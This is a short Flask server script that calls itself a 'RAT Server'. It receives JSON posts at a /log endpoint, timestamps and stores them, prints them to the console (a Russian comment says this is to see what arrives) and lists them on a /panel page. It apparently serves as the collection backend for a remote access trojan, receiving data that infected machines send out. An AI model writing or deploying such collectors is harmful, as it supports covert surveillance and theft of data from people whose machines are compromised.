from flask import Flask, render_template, request
import datetime

app = Flask(__name__)
logs = []

@app.route('/log', methods=['POST'])
def log():
    content = request.json
    content['time'] = datetime.datetime.now().strftime('%H:%M:%S')
    logs.append(content)
    print(content)  # Чтобы видеть в консоли, что приходит
    return 'OK'

@app.route('/panel')
def panel():
    return render_template('panel.html', logs=logs)

@app.route('/')
def index():
    return '<h1>RAT Server is running</h1>'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
